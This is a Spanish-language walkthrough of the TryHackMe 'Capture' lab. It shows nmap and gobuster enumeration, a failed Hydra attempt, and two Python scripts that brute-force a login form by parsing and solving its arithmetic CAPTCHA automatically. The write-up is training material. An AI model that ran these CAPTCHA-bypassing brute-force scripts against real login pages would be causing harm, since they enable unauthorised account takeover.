---
title: "Capture"
description: "Capture"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/capture

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.139.144
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240430193835.png)

## Gobuster

````
gobuster dir -u http://10.10.139.144 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240430214946.png)

# Fase de ataque

## Hydra

Intentamos con Hydra al formulario pero no da resultado debido a que tras un numero de intentos se activa un CAPTCHA

````
hydra -L usernames.txt -P passwords.txt "http-post-form://10.10.139.144/login:username=^USER^&password=^PASS^:Error"
````

## Script fuerza bruta

Primero buscamos el usuario

````
import requests
import re

url = "http://10.10.64.26/login"
usuarios_file = "usernames.txt"
contrasenas_file = "passwords.txt"

with open(contrasenas_file, 'r') as contrasenas:
    lista_contrasenas = [contrasena.strip() for contrasena in contrasenas.readlines()]

with open(usuarios_file, 'r') as usuarios:
    for contrasena in lista_contrasenas:
        for usuario in usuarios:
            usuario = usuario.strip()
            data = {"username": usuario, "password": contrasena}
            respuesta = requests.post(url, data=data)
            web = respuesta.content.decode('utf-8')

            if "Invalid captcha" in web:
                numeros = re.findall(r'(\d+)\s*([-+])\s*(\d+)', web)
                if numeros:
                    num1, operador, num2 = numeros[0]
                    if operador == '+':
                        captcha = int(num1) + int(num2)
                    else:
                        captcha = int(num1) - int(num2)

                    data["captcha"] = captcha
                    respuestac = requests.post(url, data=data)
                    webc = respuestac.content.decode('utf-8')

                    if "Invalid captcha" not in webc:
                        print("Usuario:", usuario, ", Contrasena:", contrasena)

                        if "does not exist" not in webc:
                            print("Usuario encontrado:", usuario, "!")
                            if "Invalid password" not in webc:
                                print("Contrasena valida para", usuario, ":", contrasena)
                                exit()

            else:
                if "does not exist" not in web:
                    print("Usuario encontrado:", usuario, "!")
                    if "Invalid password" not in web:
                        print("Contrasena valida para", usuario, ":", contrasena)
                        exit()
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240430225706.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240430225750.png)
Ahora buscamos la contraseña

````
import requests

import re

  

url = "http://10.10.64.26/login"

contrasenas_file = "passwords.txt"

  

with open(contrasenas_file, 'r') as contrasenas:

    lista_contrasenas = [contrasena.strip() for contrasena in contrasenas.readlines()]

    for contrasena in lista_contrasenas:

        data = {"username": "natalie", "password": contrasena}

        respuesta = requests.post(url, data=data)

        web = respuesta.content.decode('utf-8')

  

        if "Invalid captcha" in web:

            numeros = re.findall(r'(\d+)\s*([-+])\s*(\d+)', web)

            if numeros:

                num1, operador, num2 = numeros[0]

                if operador == '+':

                    captcha = int(num1) + int(num2)

                else:

                    captcha = int(num1) - int(num2)

  

                data["captcha"] = captcha

                respuestac = requests.post(url, data=data)

                webc = respuestac.content.decode('utf-8')

  

                if "Invalid captcha" not in webc:

                    print("Usuario:", "natalie", "Contrasena:", contrasena)

                    if "does not exist" not in webc:

                        if "Invalid password" not in webc:

                            print("Contrasena valida para", "natalie", ":", contrasena)

                            exit()

        else:

            if "does not exist" not in web:

                if "Invalid password" not in web:

                    print("Contrasena valida para", "natalie", ":", contrasena)

                    exit()
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240430230655.png)
\[-\] ==pwned!==
